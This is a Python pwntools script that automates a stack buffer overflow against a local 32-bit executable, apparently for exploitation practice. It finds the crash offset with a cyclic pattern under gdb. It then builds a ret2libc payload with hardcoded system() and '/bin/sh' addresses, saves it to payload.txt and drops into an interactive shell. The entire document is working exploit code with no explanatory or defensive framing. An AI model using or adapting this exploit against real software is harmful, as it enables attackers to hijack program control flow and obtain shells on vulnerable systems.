# take filename as argument
# take desired fn name as argument
# take sequence length as arg default 50
import argparse
from pwn import *

parser = argparse.ArgumentParser()
parser.add_argument("exe", help="Executable name")
parser.add_argument("func", help="Function name")
parser.add_argument("--seqlen", type=int, default=50, help="Overflow sequence length")

args = parser.parse_args()
exe, func, seqlen = args.exe, args.func, args.seqlen

# find address of desired fn
elf = ELF(exe)
mangled_fn = "notfound"
fn_address="unknown"
for function_name, function_addr in elf.symbols.items():
	if func in function_name:
		mangled_fn=function_name
		fn_address=int(function_addr)
		break

print("We are jumping to ", func,  mangled_fn, p32(fn_address),"after the smash")


# start gdb with pwn
sh = process(exe)
gdb_get_offset = gdb.attach(
sh,
gdbscript='continue', 
)

#receive - enable if needed
#sh.recvline(timeout=1)

# generate sequence to smash stack
g = cyclic_gen()
smasher = g.get(seqlen)
sh.info("Trying to smash stack with: ")
sh.info(str(smasher))

# send sequence
sh.sendline(smasher)
user_input = input("Stack is smashed, get the value from eip, to calculate offset! Than exit gdb\n")
sh.close()

# second round with offset from ip
smashoffset = cyclic_find(user_input)
g=cyclic_gen()
system_address=0x2a5f5220
fake_return_address=0xdeadbeef
bin_sh_address=0x2a769e52

smasher = g.get(smashoffset) + p32(system_address) + p32(fake_return_address) + p32(bin_sh_address)
print("Trying to smash stack with: ", smasher, "length: ", smashoffset)

with open('payload.txt', 'wb') as fw:
    fw.write(smasher)

sh = process(exe)
gdb_smash = gdb.attach(
sh,
gdbscript='break sayhello', 
)

sh.sendline(smasher)
sh.interactive()
sh.close()
